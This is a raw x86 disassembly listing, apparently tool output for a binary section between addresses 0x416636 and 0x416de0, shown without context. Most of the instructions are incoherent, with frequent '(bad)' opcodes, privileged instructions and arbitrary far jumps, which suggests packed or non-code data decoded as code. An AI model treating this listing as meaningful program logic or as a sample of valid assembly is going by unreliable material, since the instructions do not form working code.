  416636:	imul   eax,DWORD PTR [edx+edi*4-0x6b5ece25],0x48087f28
  416641:	xor    ebx,0x37
  416644:	loopne 0x4165d4
  416646:	or     DWORD PTR [ebx],ebx
  416648:	dec    edx
  416649:	xor    ecx,eax
  41664b:	lea    esi,[edx+edx*8-0x28]
  41664f:	xor    eax,DWORD PTR [ecx]
  416651:	hlt    
  416652:	xlat   BYTE PTR ds:[ebx]
  416653:	xchg   edx,eax
  416654:	and    al,0x7d
  416656:	sub    al,0xb6
  416658:	mov    BYTE PTR [eax+0x769ff106],bh
  41665e:	lds    ebx,FWORD PTR [eax-0x575db3be]
  416664:	fisub  DWORD PTR [ebx+eiz*4]
  416667:	les    ecx,FWORD PTR fs:[ebp+ebx*4-0x4b]
  41666c:	lea    ebx,[edi-0x5]
  41666f:	stos   DWORD PTR es:[edi],eax
  416670:	repnz push ebx
  416672:	sub    DWORD PTR [ecx],eax
  416674:	and    edi,DWORD PTR [esi-0x4a12500f]
  41667a:	pop    ebp
  41667b:	mov    al,0x57
  41667d:	inc    ebx
  41667e:	jno    0x416630
  416680:	mov    ebp,0xa06c5482
  416685:	mov    ah,0x36
  416687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416688:	loopne 0x41661b
  41668a:	push   ebx
  41668b:	ds xchg esi,eax
  41668d:	mov    ebp,0x515f2939
  416692:	pop    esi
  416693:	push   ds
  416694:	adc    DWORD PTR [ebp-0x3c],ebp
  416697:	stc    
  416698:	mov    bl,0xf2
  41669a:	js     0x4166bf
  41669c:	push   edi
  41669d:	mov    edx,0x9c931b7a
  4166a2:	sbb    al,BYTE PTR [esi+eiz*2-0x4]
  4166a6:	inc    esp
  4166a7:	mov    WORD PTR [esi-0x80],ss
  4166aa:	rol    esp,1
  4166ac:	fs xor bl,BYTE PTR fs:[esi+0x3183f7f3]
  4166b4:	fmul   DWORD PTR [eax]
  4166b6:	cld    
  4166b7:	push   edx
  4166b8:	pushf  
  4166b9:	pop    esp
  4166ba:	or     DWORD PTR [edx-0x1b],eax
  4166bd:	(bad)  
  4166be:	(bad)  
  4166bf:	inc    ebx
  4166c0:	pop    edx
  4166c1:	fdiv   QWORD PTR [ecx+0x7]
  4166c4:	fist   WORD PTR [eax]
  4166c6:	jecxz  0x4166c5
  4166c8:	test   ch,ah
  4166ca:	adc    al,0x15
  4166cc:	pop    ebp
  4166cd:	push   0xfffffff0
  4166cf:	test   DWORD PTR [ebp-0x71381617],ecx
  4166d5:	inc    esi
  4166d6:	jno    0x416669
  4166d8:	xchg   BYTE PTR [edx-0x7dedd58c],ch
  4166de:	cmp    DWORD PTR [eax],ebx
  4166e0:	icebp  
  4166e1:	dec    esp
  4166e2:	icebp  
  4166e3:	in     al,0x6f
  4166e5:	sub    bh,al
  4166e7:	test   DWORD PTR [esi],ebp
  4166e9:	ret    
  4166ea:	popa   
  4166eb:	out    0x37,al
  4166ed:	shr    bh,cl
  4166ef:	sti    
  4166f0:	imul   esp,DWORD PTR [edi],0x9e28f892
  4166f6:	cmc    
  4166f7:	pop    ss
  4166f8:	sbb    al,0xf
  4166fa:	pop    edx
  4166fb:	xchg   dl,dh
  4166fd:	stos   BYTE PTR es:[edi],al
  4166fe:	sti    
  4166ff:	shl    ah,1
  416701:	cld    
  416702:	pushf  
  416703:	leave  
  416704:	fdivp  st(3),st
  416706:	add    eax,0x482b75e2
  41670b:	mov    ebx,0xffae0fc6
  416710:	pop    edi
  416711:	loope  0x4166a8
  416713:	stc    
  416714:	or     bl,BYTE PTR [ecx-0x7e]
  416717:	and    al,0xcd
  416719:	push   ecx
  41671a:	bound  edx,QWORD PTR [eax+0x36e57d1e]
  416720:	pusha  
  416721:	xchg   esp,eax
  416722:	scas   eax,DWORD PTR es:[edi]
  416723:	out    dx,eax
  416724:	js     0x416796
  416726:	jnp    0x4166e7
  416728:	icebp  
  416729:	push   ecx
  41672a:	xor    DWORD PTR [ecx],edi
  41672c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41672d:	fcom   QWORD PTR [edx+eax*1]
  416730:	ins    BYTE PTR es:[edi],dx
  416731:	dec    ebp
  416732:	test   eax,0xae60199a
  416737:	xchg   ebp,edx
  416739:	(bad)  
  41673a:	int3   
  41673b:	xor    al,0x15
  41673d:	cmc    
  41673e:	add    esp,eax
  416740:	xchg   BYTE PTR [ecx+ebp*8],dh
  416743:	lock popa 
  416745:	add    eax,0xa539e887
  41674a:	xchg   DWORD PTR [bp+si+0x50],ebp
  41674e:	neg    DWORD PTR [edi+0x3c]
  416751:	pop    edi
  416752:	jne    0x416749
  416754:	jbe    0x4167a0
  416756:	fisttp WORD PTR [edi]
  416758:	les    ebp,FWORD PTR [edx-0x58]
  41675b:	pop    esp
  41675c:	cmp    al,0xfb
  41675e:	push   edx
  41675f:	xchg   esp,eax
  416760:	xchg   BYTE PTR [ecx],ah
  416762:	mov    bh,0xfd
  416764:	sahf   
  416765:	jp     0x416719
  416767:	arpl   WORD PTR [esi-0x48],ax
  41676a:	fcom   QWORD PTR [ebp+0x676312ed]
  416770:	and    al,0xf3
  416772:	ds mov ecx,0xc1ccd1e2
  416778:	jecxz  0x4167f4
  41677a:	stos   DWORD PTR es:[edi],eax
  41677b:	neg    BYTE PTR ds:[esi-0x6d75d26d]
  416782:	mov    ebp,0x7b8e0c24
  416787:	sbb    DWORD PTR [eax-0x3f7680ff],0x466b2eff
  416791:	pop    ss
  416792:	pop    eax
  416793:	xchg   esp,eax
  416794:	icebp  
  416795:	sub    BYTE PTR [ebx+0x39],cl
  416798:	out    dx,al
  416799:	mov    ecx,0xc536b76d
  41679e:	fidivr WORD PTR [esi+esi*1]
  4167a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167a2:	jo     0x416749
  4167a4:	std    
  4167a5:	mov    cl,0x7a
  4167a7:	and    BYTE PTR [ebx],al
  4167a9:	sub    esi,DWORD PTR [ecx]
  4167ab:	inc    edx
  4167ac:	inc    esp
  4167ad:	mov    BYTE PTR [esi-0x1d],dh
  4167b0:	jmp    0x4167b8
  4167b2:	fst    DWORD PTR [edx-0x4f]
  4167b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167b6:	pop    ds
  4167b7:	adc    eax,ebp
  4167b9:	enter  0xd5b,0xd5
  4167bd:	test   al,0x64
  4167bf:	inc    esp
  4167c0:	push   edi
  4167c1:	mov    ebx,0x6eba5226
  4167c6:	mov    ecx,DWORD PTR [edx+0x2b7d95b9]
  4167cc:	outs   dx,DWORD PTR ds:[esi]
  4167cd:	sub    ch,BYTE PTR [esi]
  4167cf:	arpl   WORD PTR [esi+0x3],di
  4167d2:	adc    bh,0x95
  4167d5:	pop    ebx
  4167d6:	push   0xffffffc2
  4167d8:	lds    eax,FWORD PTR [esi]
  4167da:	mov    dl,0xf7
  4167dc:	je     0x41682e
  4167de:	in     al,0xf3
  4167e0:	inc    esp
  4167e1:	mov    eax,0x14f8d70a
  4167e6:	shl    DWORD PTR [edx-0x184fb2cb],1
  4167ec:	push   cs
  4167ed:	cli    
  4167ee:	jnp    0x416815
  4167f0:	jae    0x416856
  4167f2:	or     edi,DWORD PTR [eax]
  4167f4:	jle    0x416848
  4167f6:	in     eax,dx
  4167f7:	fistp  QWORD PTR [ebp-0x2198785d]
  4167fd:	and    dl,0x78
  416800:	add    ch,cl
  416802:	cwde   
  416803:	push   0x8ebc6e6b
  416808:	inc    eax
  416809:	add    eax,0xd01f2ed3
  41680e:	or     esi,edi
  416810:	outs   dx,DWORD PTR ds:[esi]
  416811:	shr    BYTE PTR [esi-0xf6a9439],0x1d
  416818:	pop    esi
  416819:	(bad)  
  41681a:	mov    dl,0x65
  41681c:	out    dx,eax
  41681d:	test   al,0xe8
  41681f:	shr    DWORD PTR [edx+0x5b],0x12
  416823:	inc    esi
  416824:	push   edx
  416825:	jmp    0xd342:0xf188f3fd
  41682c:	out    0xb3,al
  41682e:	stos   DWORD PTR es:[edi],eax
  41682f:	mov    al,0x11
  416831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416832:	and    esi,esp
  416834:	dec    edx
  416835:	enter  0x2275,0x39
  416839:	iret   
  41683a:	mov    esi,0x5d8afa95
  41683f:	push   ecx
  416840:	clc    
  416841:	mov    eax,0x12252fc5
  416846:	fcomp  DWORD PTR [edi]
  416848:	mov    ch,BYTE PTR [edx+0x31]
  41684b:	cdq    
  41684c:	inc    ebx
  41684d:	jmp    0xf643:0x9ac025df
  416854:	and    BYTE PTR [edi-0x56],0x10
  416858:	dec    ebp
  416859:	jg     0x416854
  41685b:	fstp   TBYTE PTR [ecx-0x65e3a171]
  416861:	mov    edx,0xa0d69d21
  416866:	inc    edi
  416867:	fld    TBYTE PTR [ecx+edx*8]
  41686a:	sahf   
  41686b:	xor    eax,eax
  41686d:	fs test eax,0x30ed0ec0
  416873:	pushf  
  416874:	or     al,0xc0
  416876:	dec    esp
  416877:	mov    WORD PTR [ebx-0x71],cs
  41687a:	retf   0x22e3
  41687d:	bound  edx,QWORD PTR [ecx]
  41687f:	retf   
  416880:	scas   eax,DWORD PTR es:[edi]
  416881:	cld    
  416882:	and    edx,DWORD PTR [ebp-0x1dade92a]
  416888:	(bad)  
  416889:	out    dx,eax
  41688a:	cmp    eax,0x7cdad08e
  416890:	ficomp WORD PTR [eax+0x1242983a]
  416896:	fs mov al,0x21
  416899:	test   al,0x8
  41689b:	mov    eax,ds:0xd62bbe8a
  4168a0:	inc    ebx
  4168a1:	fwait
  4168a2:	loopne 0x416834
  4168a4:	clc    
  4168a5:	push   ecx
  4168a6:	lahf   
  4168a7:	fstp   QWORD PTR [eax]
  4168a9:	and    eax,0xabede9a4
  4168ae:	fldcw  WORD PTR [edi+0x1b]
  4168b1:	gs jae 0x416925
  4168b4:	loope  0x4168f8
  4168b6:	loopne 0x416858
  4168b8:	adc    eax,0xad466f42
  4168bd:	dec    ecx
  4168be:	arpl   WORD PTR [ecx+0x9],di
  4168c1:	ret    
  4168c2:	cmp    eax,0x66e1f89b
  4168c7:	mov    ds:0x4818af6a,eax
  4168cc:	adc    DWORD PTR [edx+0x23],ebx
  4168cf:	mov    bh,0xeb
  4168d1:	loop   0x41690a
  4168d3:	push   es
  4168d4:	push   0x7d
  4168d6:	popa   
  4168d7:	jne    0x41692b
  4168d9:	xor    al,0x21
  4168db:	fdecstp 
  4168dd:	ret    0xe619
  4168e0:	mov    ebx,fs
  4168e2:	cli    
  4168e3:	mov    ecx,0x834ebed2
  4168e8:	test   eax,0x8b2465c2
  4168ed:	dec    esi
  4168ee:	jle    0x416939
  4168f0:	fmul   DWORD PTR [ebx+0x6b127cdd]
  4168f6:	inc    eax
  4168f7:	fcom   st(3)
  4168f9:	cwde   
  4168fa:	dec    ebx
  4168fb:	lahf   
  4168fc:	mov    cl,0x27
  4168fe:	fnstcw WORD PTR [esi]
  416900:	add    al,0x8b
  416902:	pop    ebp
  416903:	pop    ebp
  416904:	and    bl,dh
  416906:	ja     0x41697f
  416908:	(bad)
  41690d:	push   cs
  41690e:	rcr    BYTE PTR [edx],0x3b
  416911:	repz es jg 0x41695b
  416915:	push   edi
  416916:	je     0x416980
  416918:	sub    ah,al
  41691a:	icebp  
  41691b:	sbb    eax,0xa0aa55e1
  416920:	popf   
  416921:	dec    edi
  416922:	jl     0x416906
  416924:	push   eax
  416925:	jmp    FWORD PTR [ecx]
  416927:	sbb    al,0x77
  416929:	out    dx,al
  41692a:	xor    esp,edi
  41692c:	scas   al,BYTE PTR es:[edi]
  41692d:	jnp    0x4168f0
  41692f:	cmp    BYTE PTR [edx+0x7f],dl
  416932:	call   0x4a25772b
  416937:	jns    0x41697c
  416939:	inc    esp
  41693a:	fcmove st,st(3)
  41693c:	mov    ebx,cs
  41693e:	cmp    bh,ch
  416940:	(bad)  [ecx]
  416942:	mov    edx,0xaf2afa0b
  416947:	lods   al,BYTE PTR ds:[esi]
  416948:	add    DWORD PTR [edx],ebx
  41694a:	in     al,dx
  41694b:	idiv   DWORD PTR [eax]
  41694d:	mov    al,0x1b
  41694f:	mov    ebx,DWORD PTR [ecx-0x53d5f413]
  416955:	add    al,0x88
  416957:	add    al,0xed
  416959:	dec    esi
  41695a:	mov    esp,0x3f731e8
  41695f:	ss enter 0xca30,0x38
  416964:	ss stos DWORD PTR es:[edi],eax
  416966:	fiadd  DWORD PTR [ebp+0x76826a9a]
  41696c:	sub    BYTE PTR [eax],bl
  41696e:	outs   dx,DWORD PTR ds:[esi]
  41696f:	mov    dh,0x51
  416971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416972:	dec    eax
  416973:	call   0xe686:0x66aaad69
  41697a:	and    dh,bl
  41697c:	lock pop esp
  41697e:	push   es
  41697f:	call   0xc5a1:0xefa536a6
  416986:	add    al,0xe9
  416988:	jbe    0x41697a
  41698a:	mov    WORD PTR [eax],?
  41698c:	enter  0xfc13,0xba
  416990:	and    BYTE PTR [esi+0x5b674176],cl
  416996:	outs   dx,BYTE PTR ds:[esi]
  416997:	mov    bh,0x77
  416999:	or     DWORD PTR [ebx*8+0x3e687acf],ecx
  4169a0:	jne    0x416965
  4169a2:	push   ecx
  4169a3:	aas    
  4169a4:	cmp    al,0xa9
  4169a6:	fist   DWORD PTR [edi+0x23c43340]
  4169ac:	call   0x1601:0x7e19118b
  4169b3:	sub    eax,DWORD PTR [eax-0x6752d35d]
  4169b9:	nop    DWORD PTR [eax+0x2edb8a8e]
  4169c0:	push   cs
  4169c1:	retf   0xffa2
  4169c4:	jmp    0x7a12:0xabacedf1
  4169cb:	ret    
  4169cc:	ja     0x4169cf
  4169ce:	enter  0xdab0,0x35
  4169d2:	(bad)
  4169d5:	test   DWORD PTR [eax-0x3d778254],esi
  4169db:	and    eax,esp
  4169dd:	aas    
  4169de:	sub    cl,BYTE PTR [ebx-0x42600c58]
  4169e4:	mov    bl,0x57
  4169e6:	xchg   edi,eax
  4169e7:	pop    edx
  4169e8:	sti    
  4169e9:	nop
  4169ea:	test   BYTE PTR [eax+0x1e],dh
  4169ed:	shr    DWORD PTR [edi],0xe0
  4169f0:	xchg   BYTE PTR [edx],ah
  4169f2:	icebp  
  4169f3:	push   esi
  4169f4:	in     al,0xec
  4169f6:	pop    es
  4169f7:	pop    esp
  4169f8:	pop    esp
  4169f9:	(bad)  
  4169fa:	or     BYTE PTR [edx-0x3d06e2bb],ch
  416a00:	stos   BYTE PTR es:[edi],al
  416a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a02:	loope  0x416a6e
  416a04:	in     eax,0x30
  416a06:	retf   0x68a
  416a09:	jne    0x4169e1
  416a0b:	cs push ebp
  416a0d:	not    DWORD PTR [ebx+0x1d]
  416a10:	ret    
  416a11:	inc    ecx
  416a12:	pop    edi
  416a13:	mov    ch,0xec
  416a15:	xlat   BYTE PTR ds:[ebx]
  416a16:	iret   
  416a17:	(bad)  
  416a18:	aad    0xb3
  416a1a:	jnp    0x4169b7
  416a1c:	pop    eax
  416a1d:	cmp    eax,0x8c7a7c1b
  416a22:	sar    DWORD PTR [edi+0x36],1
  416a25:	mov    ch,0xfb
  416a27:	stc    
  416a28:	adc    eax,0xc705b96a
  416a2d:	and    edx,DWORD PTR [esi-0x52afaeb0]
  416a33:	sub    BYTE PTR [esi],dh
  416a35:	(bad)  
  416a36:	push   esi
  416a37:	dec    ebp
  416a38:	addr16 ja 0x416a77
  416a3b:	cmc    
  416a3c:	mov    ch,0x41
  416a3e:	jge    0x416a30
  416a40:	push   ebp
  416a41:	adc    DWORD PTR [esp+esi*2-0x3c2fdbb1],edi
  416a48:	xor    BYTE PTR [eax+0xbb14724],al
  416a4e:	fcom   st(1)
  416a50:	sar    DWORD PTR [esi+0x3d8c39de],cl
  416a56:	mov    dl,0xd8
  416a58:	nop
  416a59:	or     BYTE PTR [ebx],al
  416a5b:	sub    eax,edi
  416a5d:	inc    ebp
  416a5e:	mov    ch,cl
  416a60:	xchg   esp,eax
  416a61:	add    ah,BYTE PTR [ebp+0x3d]
  416a64:	xchg   ecx,eax
  416a65:	popf   
  416a66:	stos   DWORD PTR es:[edi],eax
  416a67:	cmp    edi,eax
  416a69:	jb     0x416a9d
  416a6b:	mov    esi,0x3bab49a8
  416a70:	out    0x12,al
  416a72:	xchg   esp,eax
  416a73:	adc    BYTE PTR [edi+0x11],bh
  416a76:	jns    0x416a6a
  416a78:	lods   eax,DWORD PTR ds:[esi]
  416a79:	or     ebp,DWORD PTR [esi]
  416a7b:	test   eax,0xb5f44a52
  416a80:	mov    bh,0xa
  416a82:	test   al,0xfb
  416a84:	fnstsw WORD PTR [ebx]
  416a86:	push   esi
  416a87:	js     0x416af3
  416a89:	inc    edi
  416a8a:	mov    WORD PTR [esi+ebp*4+0x6a870540],gs
  416a91:	mov    al,BYTE PTR [ecx+0x27993240]
  416a97:	jl     0x416aa3
  416a99:	sbb    al,0x94
  416a9b:	push   edx
  416a9c:	sbb    DWORD PTR [edi],0xfffffffc
  416a9f:	add    BYTE PTR [eax+0x32],ch
  416aa2:	adc    al,0x23
  416aa4:	push   cs
  416aa5:	ret    0xe825
  416aa8:	ins    BYTE PTR es:[edi],dx
  416aa9:	or     al,0xa7
  416aab:	cdq    
  416aac:	jg     0x416a9d
  416aae:	in     al,0x3
  416ab0:	test   eax,0xe8debfcb
  416ab5:	ds mov cl,0xf8
  416ab8:	es mov bl,0xcd
  416abb:	test   eax,0x725d18e0
  416ac0:	adc    ebx,esi
  416ac2:	cmp    al,0x12
  416ac4:	movsx  edi,BYTE PTR [edx-0x77de043f]
  416acb:	or     BYTE PTR [esi-0x35],bl
  416ace:	fsub   DWORD PTR [ecx-0x8]
  416ad1:	shr    bl,cl
  416ad3:	mov    esp,0x5b86a30d
  416ad8:	les    esp,FWORD PTR ds:0xfed742a4
  416ade:	xor    cl,cl
  416ae0:	pop    esp
  416ae1:	pop    edi
  416ae2:	sbb    eax,DWORD PTR [eax+0x1a48a5a2]
  416ae8:	pop    edi
  416ae9:	(bad)  
  416aea:	cli    
  416aeb:	dec    esi
  416aec:	int3   
  416aed:	test   BYTE PTR [esi],bh
  416aef:	and    bh,BYTE PTR [esi-0x632298d4]
  416af5:	dec    esp
  416af6:	dec    esp
  416af7:	xchg   edi,eax
  416af8:	sub    eax,0x34b2c236
  416afd:	mov    esp,0x40a1b684
  416b02:	push   ecx
  416b03:	jg     0x416ad0
  416b05:	dec    ecx
  416b06:	mov    dl,0x72
  416b08:	neg    BYTE PTR [edx]
  416b0a:	inc    edx
  416b0b:	shl    DWORD PTR [eax],1
  416b0d:	jbe    0x416ad1
  416b0f:	inc    ebp
  416b10:	(bad)  
  416b11:	bound  esp,QWORD PTR [esi-0x2d6cf31b]
  416b17:	dec    ebx
  416b18:	mov    eax,ds:0xb59b931d
  416b1d:	add    DWORD PTR [ebx+0x27],ebx
  416b20:	add    al,0x88
  416b22:	aad    0x89
  416b24:	ja     0x416b8c
  416b26:	div    esp
  416b28:	inc    edi
  416b29:	or     bl,BYTE PTR [edx]
  416b2b:	xor    BYTE PTR [ecx+eax*2],al
  416b2e:	mov    ebx,0x62ceb2f4
  416b33:	cmp    cl,dh
  416b35:	sbb    DWORD PTR [ecx-0x12],ebx
  416b38:	push   ss
  416b39:	inc    eax
  416b3a:	xchg   ecx,eax
  416b3b:	lods   eax,DWORD PTR ds:[esi]
  416b3c:	mov    BYTE PTR [esi],bl
  416b3e:	push   cs
  416b3f:	pop    ss
  416b40:	inc    ebx
  416b41:	mov    BYTE PTR [ebp-0x74],cl
  416b44:	mov    eax,0x334e7a09
  416b49:	adc    al,0x24
  416b4b:	pop    es
  416b4c:	repz pop es
  416b4e:	lods   al,BYTE PTR ds:[esi]
  416b4f:	sub    ebx,eax
  416b51:	rol    BYTE PTR [esp+ecx*4+0x26ad96e6],1
  416b58:	or     ebp,ebp
  416b5a:	and    esp,esp
  416b5c:	loop   0x416baa
  416b5e:	jbe    0x416b2f
  416b60:	aas    
  416b61:	xchg   edi,eax
  416b62:	outs   dx,DWORD PTR ds:[esi]
  416b63:	mov    ebx,DWORD PTR [ebx]
  416b65:	inc    ecx
  416b66:	cmc    
  416b67:	mov    DWORD PTR [esi-0x75],esp
  416b6a:	scas   eax,DWORD PTR es:[edi]
  416b6b:	or     al,0x5e
  416b6d:	daa    
  416b6e:	rcr    DWORD PTR [edx+0x277a8a1f],cl
  416b74:	jl     0x416b60
  416b76:	jno    0x416b6d
  416b78:	pop    ds
  416b79:	aam    0xf6
  416b7b:	hlt    
  416b7c:	jge    0x416ba1
  416b7e:	mov    eax,0xa6114040
  416b83:	outs   dx,DWORD PTR ds:[esi]
  416b84:	fdiv   QWORD PTR [ecx-0x1]
  416b87:	push   ebp
  416b88:	int3   
  416b89:	cs or  bl,0x3e
  416b8d:	cwde   
  416b8e:	add    edi,DWORD PTR [edx+0x37]
  416b91:	pop    ecx
  416b92:	lea    ebp,[ecx]
  416b94:	jp     0x416bc9
  416b96:	push   eax
  416b97:	lods   eax,DWORD PTR ds:[esi]
  416b98:	sub    DWORD PTR [eax-0x7c326c30],0x4c972bda
  416ba2:	cld    
  416ba3:	ds dec edx
  416ba5:	add    edx,edi
  416ba7:	loop   0x416bd8
  416ba9:	jmp    0xf9fc9326
  416bae:	icebp  
  416baf:	mov    eax,ds:0xdd792073
  416bb4:	jbe    0x416c09
  416bb6:	jl     0x416be4
  416bb8:	sbb    al,0x26
  416bba:	lock or DWORD PTR [edi],edx
  416bbd:	retf   
  416bbe:	fwait
  416bbf:	retf   
  416bc0:	fwait
  416bc1:	jecxz  0x416b79
  416bc3:	adc    DWORD PTR [ebp+0x15a5b886],edi
  416bc9:	mov    ah,0xee
  416bcb:	lods   al,BYTE PTR ds:[esi]
  416bcc:	aad    0xbe
  416bce:	mov    ebp,0xb58065a2
  416bd3:	jns    0x416b9d
  416bd5:	cmp    esp,ebp
  416bd7:	pop    eax
  416bd8:	pop    di
  416bda:	inc    ebx
  416bdb:	jns    0x416c56
  416bdd:	xor    dl,BYTE PTR [ebx]
  416bdf:	ret    
  416be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416be1:	idiv   BYTE PTR [edx]
  416be3:	es sahf 
  416be5:	dec    esp
  416be6:	dec    eax
  416be7:	sbb    DWORD PTR [edi],edx
  416be9:	idiv   DWORD PTR [esi-0x321f1c28]
  416bef:	rcl    BYTE PTR [ecx+0x8],0xd0
  416bf3:	sbb    esi,DWORD PTR [ebx-0xa]
  416bf6:	test   DWORD PTR [edi+ebx*1+0x37],ecx
  416bfa:	dec    esi
  416bfb:	sub    dh,BYTE PTR [edi+0x262a2a97]
  416c01:	sub    ebx,edx
  416c03:	add    eax,0xd4dda0c9
  416c08:	hlt    
  416c09:	or     eax,0x73b969ab
  416c0e:	imul   esp,DWORD PTR ds:0x457fc506,0x4b69c056
  416c18:	jo     0x416bdb
  416c1a:	mov    DWORD PTR [esp+eiz*2],esi
  416c1d:	(bad)  
  416c1e:	sbb    dh,BYTE PTR [eax-0x3c]
  416c21:	cmp    al,0x9b
  416c23:	fs jne 0x416c8f
  416c26:	jg     0x416bff
  416c28:	(bad)  
  416c29:	in     al,0x5d
  416c2b:	mov    esp,0x5a7cb6a7
  416c30:	icebp  
  416c31:	sub    edx,DWORD PTR [eax-0x16]
  416c34:	daa    
  416c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c36:	adc    edx,0xbf96c3bf
  416c3c:	enter  0x1bcd,0xbc
  416c40:	fdivr  st(5),st
  416c42:	add    ebx,DWORD PTR [eax-0x34]
  416c45:	cs cdq 
  416c47:	jnp    0x416bfe
  416c49:	sub    BYTE PTR [ebx-0x75],0x51
  416c4d:	jb     0x416c4b
  416c4f:	xchg   ecx,ebp
  416c51:	lods   al,BYTE PTR ds:[esi]
  416c52:	xor    dh,BYTE PTR [ebp-0x2]
  416c55:	and    eax,0xd2fa2e3a
  416c5a:	retf   0xaf88
  416c5d:	or     ch,BYTE PTR [eax+0x14]
  416c60:	pmuludq mm0,QWORD PTR [edi]
  416c63:	test   eax,0xea3eb680
  416c68:	retf   0x161f
  416c6b:	(bad)  
  416c6c:	fistp  QWORD PTR [esi-0x71b177cb]
  416c72:	sbb    dl,dh
  416c74:	sbb    eax,0x820a46bf
  416c79:	dec    edx
  416c7a:	dec    esi
  416c7b:	std    
  416c7c:	xchg   WORD PTR [ebx+0x62],bx
  416c80:	jecxz  0x416c35
  416c82:	ins    BYTE PTR es:[edi],dx
  416c83:	ss push edi
  416c85:	js     0x416c12
  416c87:	fimul  WORD PTR [ecx-0x7fbceccb]
  416c8d:	mov    BYTE PTR [ebx-0x76],cl
  416c90:	inc    ecx
  416c91:	xchg   BYTE PTR [esi+0x15620aa4],dl
  416c97:	pop    eax
  416c98:	adc    BYTE PTR [ecx-0x1cff2ed0],0x7f
  416c9f:	pop    esi
  416ca0:	(bad)  
  416ca1:	fnstsw WORD PTR [ebp-0x68]
  416ca4:	mov    esp,0x44e838aa
  416ca9:	lods   al,BYTE PTR ds:[esi]
  416caa:	sub    DWORD PTR [ebx-0x11],esp
  416cad:	cmp    eax,0x4c675fc
  416cb2:	pusha  
  416cb3:	pushf  
  416cb4:	sbb    DWORD PTR ds:0x32d51200,ebx
  416cba:	push   ebx
  416cbb:	icebp  
  416cbc:	(bad)  
  416cbe:	mov    cl,0x6e
  416cc0:	lods   al,BYTE PTR ds:[esi]
  416cc1:	jmp    0x416cd2
  416cc3:	test   eax,0x1b04e31d
  416cc8:	sti    
  416cc9:	fld    QWORD PTR [eax]
  416ccb:	and    DWORD PTR [edi-0x65],esi
  416cce:	loopne 0x416c7b
  416cd0:	je     0x416ca6
  416cd2:	xchg   ebp,eax
  416cd3:	mov    edi,0x4f8c7f5a
  416cd8:	push   ebx
  416cd9:	rol    DWORD PTR [eax-0x14],0x51
  416cdd:	or     esp,DWORD PTR [esi-0x35]
  416ce0:	fdiv   DWORD PTR [ebp-0x171f21a2]
  416ce6:	and    esp,DWORD PTR ds:0x653b8a96
  416cec:	xchg   DWORD PTR [edx],esi
  416cee:	popf   
  416cef:	push   esi
  416cf0:	adc    al,0xba
  416cf2:	xchg   edi,eax
  416cf3:	rcr    BYTE PTR [ebp-0x5670146d],cl
  416cf9:	int3   
  416cfa:	cmc    
  416cfb:	add    BYTE PTR [esi],bl
  416cfd:	pop    ss
  416cfe:	push   cs
  416cff:	cdq    
  416d00:	stos   DWORD PTR es:[edi],eax
  416d01:	out    0x5a,al
  416d03:	setl   BYTE PTR [edi-0x61226184]
  416d0a:	aad    0x42
  416d0c:	sub    ch,BYTE PTR [edi-0x4f]
  416d0f:	repnz push esi
  416d11:	xor    ah,dl
  416d13:	cdq    
  416d14:	inc    esp
  416d15:	jg     0x416d08
  416d17:	xor    esi,ecx
  416d19:	in     al,dx
  416d1a:	test   DWORD PTR [ebp+0x2f3226f7],edx
  416d20:	scas   eax,DWORD PTR es:[edi]
  416d21:	xor    ch,ch
  416d23:	div    DWORD PTR [edx-0x7c]
  416d26:	inc    esi
  416d27:	pop    esp
  416d28:	gs sbb eax,0x85b98157
  416d2e:	ror    DWORD PTR [bx+di],0xe2
  416d32:	sub    eax,0x3fb62bbc
  416d37:	add    BYTE PTR [eax],al
  416d39:	push   es
  416d3a:	loopne 0x416d14
  416d3c:	xor    ecx,DWORD PTR [edi+0x5e]
  416d3f:	push   ebx
  416d40:	push   eax
  416d41:	iret   
  416d42:	pop    eax
  416d43:	rol    al,cl
  416d45:	mov    ah,0x11
  416d47:	mov    ds:0x95e3c40b,al
  416d4c:	sahf   
  416d4d:	in     eax,0xaa
  416d4f:	sub    ebx,DWORD PTR [ebx-0x75]
  416d52:	std    
  416d53:	pop    es
  416d54:	ror    BYTE PTR [ebx-0x80],0xcb
  416d58:	sbb    DWORD PTR [eax+edi*4],ebp
  416d5b:	gs sub eax,0x9fae6142
  416d61:	test   DWORD PTR [edx+0x7b2ccaed],0x791b877b
  416d6b:	iret   
  416d6c:	jmp    0x416d1b
  416d6e:	cmp    eax,0x5e91d1f1
  416d73:	cmp    eax,0xbbd79e6b
  416d78:	jecxz  0x416db6
  416d7a:	adc    dl,0x1d
  416d7d:	dec    ebp
  416d7e:	xchg   edi,eax
  416d7f:	ret    0x8040
  416d82:	inc    eax
  416d83:	and    BYTE PTR [edx-0x542a08f7],ch
  416d89:	add    al,0x6b
  416d8b:	lods   eax,DWORD PTR ds:[esi]
  416d8c:	sbb    al,0xad
  416d8e:	cmp    al,0xfb
  416d90:	into   
  416d91:	imul   edi,DWORD PTR ds:0x5c3b165e,0xbf9b3a67
  416d9b:	sbb    BYTE PTR [ebx-0x5985130e],ch
  416da1:	imul   ecx,ebx,0x2e
  416da4:	mov    ebx,0x7cab7441
  416da9:	clc    
  416daa:	pop    ecx
  416dab:	retf   
  416dac:	or     BYTE PTR [esi],cl
  416dae:	cld    
  416daf:	xor    DWORD PTR [edx],edi
  416db1:	test   edi,0xfa7222b1
  416db7:	jle    0x416e2c
  416db9:	pop    edx
  416dba:	stc    
  416dbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dbc:	cmp    esp,DWORD PTR [ebx+edx*2]
  416dbf:	(bad)  
  416dc0:	pop    eax
  416dc1:	mov    edx,0x991c76a6
  416dc6:	and    eax,0xe56cd4e7
  416dcb:	cmp    eax,DWORD PTR [edx-0x6de0f1ad]
  416dd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dd2:	ret    0xae4
  416dd5:	cwde   
  416dd6:	inc    eax
  416dd7:	jns    0x416df7
  416dd9:	icebp  
  416dda:	add    DWORD PTR [edx+ebp*2-0x39],0xffffffe8
  416ddf:	das    
  416de0:	clc    
